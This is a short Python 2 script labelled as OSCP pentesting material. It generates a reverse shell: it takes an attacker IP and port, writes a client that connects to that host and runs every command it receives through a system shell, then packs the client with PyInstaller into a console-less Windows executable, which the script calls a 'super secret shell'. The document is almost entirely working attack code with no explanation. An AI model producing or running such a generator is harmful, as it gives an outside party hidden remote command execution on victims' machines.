OSCP pentesting commands - shell generator part 5
#!/usr/bin/env python
import os, time

print "Welcome to the Reverse Shell Generator"
IP = raw_input("Enter the Reverse IP: ")
PORT = raw_input("Enter the PORT: ")

dir_path = "C:\\shell\\"

if not os.path.exists(dir_path):
        os.makedirs(dir_path)

f = open("C:\\shell\\shell.py","w")
f.write("#!/usr/bin/python" + "\n")
f.write("import socket,subprocess" + "\n")
f.write("HOST = '" + IP.strip() + "'" + "\n")
f.write("PORT = " + PORT.strip() + "\n")
f.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n")
f.write("s.connect((HOST, PORT))" + "\n")
f.write("s.send('[*] Connection Established!')" + "\n")
f.write("while 1:" + "\n")
f.write("  data = s.recv(1024)" + "\n")
f.write("  if data == 'quit': break" + "\n")
f.write("  proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)" + "\n")
f.write("  stdout_value = proc.stdout.read() + proc.stderr.read()" + "\n")
f.write("  s.send(stdout_value)" + "\n")
f.write("s.close()" + "\n")
f.close()

try:
    print "Running"
    qqq = os.popen("C:\\python27\\python.exe C:\\pyinstaller-2.0\\pyinstaller-2.0\pyinstaller.py --out=C:\\shell\\ --noconsole --onefile C:\\shell\\shell.py")
    print "Complete.  Your super secret shell is located:  C:\\shell\\dist\\shell.exe"
    time.sleep(3)
except:
    print "Shell Failed"
